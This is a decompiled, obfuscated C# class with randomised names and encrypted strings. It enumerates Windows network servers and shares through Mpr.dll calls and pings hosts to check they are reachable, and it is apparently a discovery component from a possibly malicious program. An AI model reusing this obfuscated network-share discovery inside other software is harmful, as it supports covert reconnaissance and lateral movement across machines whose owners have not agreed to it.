using System;
using System.Collections;
using System.Collections.Generic;
using System.Net.NetworkInformation;
using System.Runtime.InteropServices;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace vlFwgXmbIo;

internal sealed class pkcHoAftRnR
{
	public enum KYGuWVnUTxQGQ
	{
		YBNVpdyVGV = 1,
		CXmXPwCeKmZe,
		OfuIqHfvrxX,
		ZBbMkEZZkDMeu,
		JOiajNhObOx
	}

	public enum ITLCMxkuvuSvCa
	{
		eiMDkWOEjfzpZ,
		TbKcdaDJGK,
		CkuTIxLmCErc,
		WRxeMRYqChRvFr
	}

	public enum jKqxxrdUdUsWmkTz
	{
		SZbIMqkbGMx = 1,
		yZENUEyXyKlv = 2,
		NNrzLXBFSUYdoad = 4,
		ZILMMACTfCCbU = 8,
		zRkBCQwJUyCDm = 16,
		XaBCllFBKoC = 19
	}

	public enum TleAxVqOHvt
	{
		KQpbjDNrpupElVp,
		KKGZJJlCBpFU,
		CmLvEdkyzEd,
		vNMPpJhQkwuKm,
		xrjKfbILhvCk,
		aauYPRpikrBN,
		WrFiIlhQWEB,
		hRfecihUHdzK,
		RccIwVXEhPEjeXRQ,
		mhxNoFSQNLXkQ,
		tKgPaBVOBaZwTzV,
		ukRChmbpvaiwAdI
	}

	public sealed class TdilPuNISOjjseev : IEnumerable
	{
		private enum SyqpzwHWmPsM
		{
			ptKNmajozxxjlrFa = 0,
			ecLIzGrlTch = 259
		}

		[StructLayout(LayoutKind.Sequential)]
		private sealed class ymYUimzzHlYMUdC
		{
			public KYGuWVnUTxQGQ lJafYQBpGz;

			public ITLCMxkuvuSvCa EhApHWuQkrN;

			public TleAxVqOHvt RxxUVvabJgUkAm;

			public jKqxxrdUdUsWmkTz hurjMfXHsQBelYRA;

			public string xsbHpgIlizTev;

			public string uDtMNzoDvOLfh;

			public string TTXOIYjdNSfEyhX;

			public string VucsjejReKIyFN;
		}

		private ArrayList nILJeyjeTDzBJ = new ArrayList();

		[DllImport("Mpr.dll")]
		private static extern SyqpzwHWmPsM WNetOpenEnumA(KYGuWVnUTxQGQ dwScope, ITLCMxkuvuSvCa dwType, jKqxxrdUdUsWmkTz dwUsage, ymYUimzzHlYMUdC p, out IntPtr lphEnum);

		[DllImport("Mpr.dll")]
		private static extern SyqpzwHWmPsM WNetCloseEnum(IntPtr intptr_0);

		[DllImport("Mpr.dll")]
		private static extern SyqpzwHWmPsM WNetEnumResourceA(IntPtr intptr_0, ref uint uint_0, IntPtr intptr_1, ref uint uint_1);

		private void EnumerateServers(ymYUimzzHlYMUdC ymYUimzzHlYMUdC_0, KYGuWVnUTxQGQ kyguWVnUTxQGQ_0, ITLCMxkuvuSvCa itlcmxkuvuSvCa_0, jKqxxrdUdUsWmkTz jKqxxrdUdUsWmkTz_0, TleAxVqOHvt tleAxVqOHvt_0)
		{
			uint uint_ = 16384u;
			IntPtr intPtr = Marshal.AllocHGlobal(16384);
			IntPtr lphEnum = IntPtr.Zero;
			uint uint_2 = 1u;
			if (WNetOpenEnumA(kyguWVnUTxQGQ_0, itlcmxkuvuSvCa_0, jKqxxrdUdUsWmkTz_0, ymYUimzzHlYMUdC_0, out lphEnum) == SyqpzwHWmPsM.ptKNmajozxxjlrFa)
			{
				SyqpzwHWmPsM syqpzwHWmPsM;
				do
				{
					syqpzwHWmPsM = WNetEnumResourceA(lphEnum, ref uint_2, intPtr, ref uint_);
					switch (syqpzwHWmPsM)
					{
					case SyqpzwHWmPsM.ecLIzGrlTch:
						continue;
					case SyqpzwHWmPsM.ptKNmajozxxjlrFa:
						Marshal.PtrToStructure(intPtr, ymYUimzzHlYMUdC_0);
						if (ymYUimzzHlYMUdC_0.RxxUVvabJgUkAm == tleAxVqOHvt_0)
						{
							nILJeyjeTDzBJ.Add(ymYUimzzHlYMUdC_0.uDtMNzoDvOLfh);
						}
						if ((ymYUimzzHlYMUdC_0.hurjMfXHsQBelYRA & jKqxxrdUdUsWmkTz.yZENUEyXyKlv) == jKqxxrdUdUsWmkTz.yZENUEyXyKlv)
						{
							EnumerateServers(ymYUimzzHlYMUdC_0, kyguWVnUTxQGQ_0, itlcmxkuvuSvCa_0, jKqxxrdUdUsWmkTz_0, tleAxVqOHvt_0);
						}
						continue;
					}
					break;
				}
				while (syqpzwHWmPsM != SyqpzwHWmPsM.ecLIzGrlTch);
				WNetCloseEnum(lphEnum);
			}
			Marshal.FreeHGlobal(intPtr);
		}

		public TdilPuNISOjjseev(KYGuWVnUTxQGQ kyguWVnUTxQGQ_0, ITLCMxkuvuSvCa itlcmxkuvuSvCa_0, jKqxxrdUdUsWmkTz jKqxxrdUdUsWmkTz_0, TleAxVqOHvt tleAxVqOHvt_0)
		{
			ymYUimzzHlYMUdC ymYUimzzHlYMUdC_ = new ymYUimzzHlYMUdC();
			EnumerateServers(ymYUimzzHlYMUdC_, kyguWVnUTxQGQ_0, itlcmxkuvuSvCa_0, jKqxxrdUdUsWmkTz_0, tleAxVqOHvt_0);
		}

		public IEnumerator GetEnumerator()
		{
			return nILJeyjeTDzBJ.GetEnumerator();
		}
	}

	public static List<string> qkwPuqIozKrciL;

	public static string oxuKhhEIDH;

	public static List<string> qBvZCyzxqWZ;

	public static List<string> WQFcrUerLUJ;

	public static List<string> pfSgQOecyZ;

	public List<string> FlVOdGeidTl = new List<string>();

	public List<string> zwvWVqIpMxftT = new List<string>();

	public List<string> LgtTprQFpXT = new List<string>();

	[NonSerialized]
	internal static GetString getString_0;

	public static bool BNCnsqaGxavT(string string_0)
	{
		bool result = false;
		Ping ping = null;
		try
		{
			using (ping = new Ping())
			{
				PingReply pingReply = ping.Send(string_0);
				result = pingReply.Status == IPStatus.Success;
				return result;
			}
		}
		catch (PingException)
		{
			return result;
		}
		finally
		{
			ping?.Dispose();
		}
	}

	static pkcHoAftRnR()
	{
		Strings.CreateGetStringDelegate(typeof(pkcHoAftRnR));
		qkwPuqIozKrciL = new List<string>();
		oxuKhhEIDH = getString_0(107391916);
		qBvZCyzxqWZ = new List<string>();
		WQFcrUerLUJ = new List<string>();
		pfSgQOecyZ = new List<string>();
	}
}
